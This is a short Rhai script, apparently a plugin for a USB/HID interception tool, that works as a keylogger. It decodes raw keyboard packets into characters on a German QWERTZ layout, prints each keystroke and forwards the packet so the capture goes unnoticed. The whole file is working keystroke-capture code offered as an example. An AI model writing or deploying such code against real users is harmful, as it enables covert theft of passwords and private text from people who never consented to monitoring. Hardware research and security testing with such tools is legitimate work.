// keylogger.rhai
// this script logs keystrokes by interpreting raw hid packets.
// it maps hid usage ids to characters using a german (qwertz) layout.
// a lot if keys are missing here this is just a example.
//
// this was only tested on the "Logitech MX Keys S (GERMAN)" and your model might require tweaking the script


fn process(interface, direction, data) {
    // only process input data (direction "IN") from a keyboard
    // check if the packet is long enough (standard keyboard report is usually 8 bytes)
    if direction == "IN" && interface.is_keyboard() && data.len() >= 8 {

        let key_code = data[2]; // byte 2 contains the first pressed key

        // 0 = no key pressed (key release) -> ignore
        if key_code != 0 {
            let key_char = "";

            // mapping hid usage id -> character
            // codes 4-29 are the alphabet
            if key_code >= 4 && key_code <= 29 {
                // rhai does not have direct ascii conversion, so we use an array.
                // this array is modified for the german qwertz layout:
                // the last two entries (positions 24 and 25) are swapped ("z" comes before "y").
                let alphabet = [
                    "a","b","c","d","e","f","g","h","i","j","k","l","m",
                    "n","o","p","q","r","s","t","u","v","w","x","z","y"
                ];
                key_char = alphabet[key_code - 4];
            }
            // codes 30-38 are 1-9
            else if key_code >= 30 && key_code <= 38 {
                let nums = ["1","2","3","4","5","6","7","8","9"];
                key_char = nums[key_code - 30];
            }
            // code 39 is 0
            else if key_code == 39 {
                key_char = "0";
            }
            // special keys
            else if key_code == 40 { key_char = "[enter]"; }
            else if key_code == 44 { key_char = "[space]"; }
            else if key_code == 41 { key_char = "[esc]"; }
            else if key_code == 42 { key_char = "[backspace]"; }
            else {
                // unknown key -> print hex code so you can look it up
                key_char = `[hex:${key_code}]`;
            }

            print(`keylogged: ${key_char}`);
        }
    }

    // forward the data
    interface.send_to(direction, data);
}